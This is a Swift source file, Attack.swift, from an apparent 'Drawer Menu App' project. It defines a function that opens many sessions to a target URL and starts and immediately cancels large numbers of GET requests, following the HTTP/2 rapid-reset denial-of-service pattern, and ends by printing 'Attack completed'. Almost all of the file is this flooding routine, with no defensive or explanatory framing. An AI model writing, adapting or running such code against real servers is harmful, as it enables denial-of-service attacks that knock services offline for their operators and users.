//
//  Attack.swift
//  Drawer Menu App
//
//  Created by ThawDeZin on 13/10/2023.
//

// Import the Alamofire and Dispatch modules
import Alamofire
import Dispatch

// Define the sendHttp2 function that takes a target URL, a number of connections, and a number of requests per connection as parameters
func sendHttp2(url: String, connections: Int, requestsPerConnection: Int) {
    // Create a dispatch group object to synchronize the connections
    let group = DispatchGroup()
    
    // Loop through the number of connections to create
    for i in 0..<connections {
        // Enter the group
        group.enter()
        
        // Create a session object that uses HTTP/2
        let session = Session(startRequestsImmediately: false)
        
        // Create an array of request objects that send GET requests to the target URL
        let requests = (0..<requestsPerConnection).map { _ in
            session.request(url, method: .get)
        }
        
        // Loop through the request objects
        for request in requests {
            // Start the request
            request.resume()
            
            // Cancel the request immediately
            request.cancel()
            
            // Print a message to indicate the progress
            print("Sent and canceled request \(i) \(request)")
            
            
        }
        
        // Leave the group when all requests are done
        session.requestQueue.async {
            group.leave()
        }
    }
    
    // Wait for all connections to finish
    group.wait()
    
    // Print a message to indicate the end of the attack
    print("Attack completed")
}


